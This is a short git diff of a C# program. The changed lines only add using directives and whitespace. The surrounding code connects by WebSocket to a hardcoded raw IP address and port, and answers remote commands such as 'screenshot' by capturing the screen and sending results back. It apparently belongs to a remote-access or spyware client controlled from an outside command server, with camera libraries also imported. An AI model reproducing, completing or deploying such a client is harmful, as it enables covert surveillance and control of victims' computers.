@@ -7,11 +7,14 @@ using System.IO;
 using System.Drawing.Imaging;
 using System.Windows.Forms;
 using Emgu.CV;
+using System.Collections.Generic;
+using System.Text;
+using System.Runtime.InteropServices;
 
 namespace A3
 {
     class Program
-    {
+    {   
         static void Main(string[] args)
         {
             using (var ws = new WebSocket("ws://154.49.211.230:4422"))
@@ -20,6 +23,7 @@ namespace A3
                 {
                     String message;
                     message = e.Data;
+
                     if (message == "screenshot")
                     {
                         ws.Send("##MESSAGE##{\"type\":\"info\", \"message\":\"Please wait, generating screenshot...\"}");
@@ -121,5 +125,6 @@ namespace A3
                 new ManualResetEvent(false).WaitOne();
             }
         }
+        
     }
 }
